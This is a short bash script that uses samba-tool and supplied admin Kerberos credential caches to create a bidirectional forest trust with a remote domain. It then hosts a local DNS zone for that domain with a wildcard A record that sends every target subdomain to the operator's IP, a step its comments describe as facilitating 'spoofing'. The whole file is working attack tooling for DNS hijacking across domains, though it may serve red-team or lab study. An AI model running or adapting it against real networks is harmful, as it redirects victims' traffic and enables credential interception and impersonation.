#!/bin/bash

localdom=$1
localdomadmuser=$2
localsuffix=$3
remdom=$4
remdomadmuser=$5
remsuffix=$6
remote=$7
localccachepath=$8
remccachepath=$9
localip=${10}

# Create bidirectional trust necessary to facilitate this kind of spoofing
sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=both -U $remdom.$remsuffix\\$remdomadmuser --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\$localdomadmuser --local-dc-use-krb5-ccache=$localccachepath

# Create wildcard record pointing all target subdomains at our network-facing local IP
sudo samba-tool dns zonecreate 127.0.0.1 $remdom.$remsuffix --use-kerberos=required --use-krb5-ccache=$localccachepath
sudo samba-tool dns add 127.0.0.1 $remdom.$remsuffix "*" A $localip --use-kerberos=required --use-krb5-ccache=$localccachepath
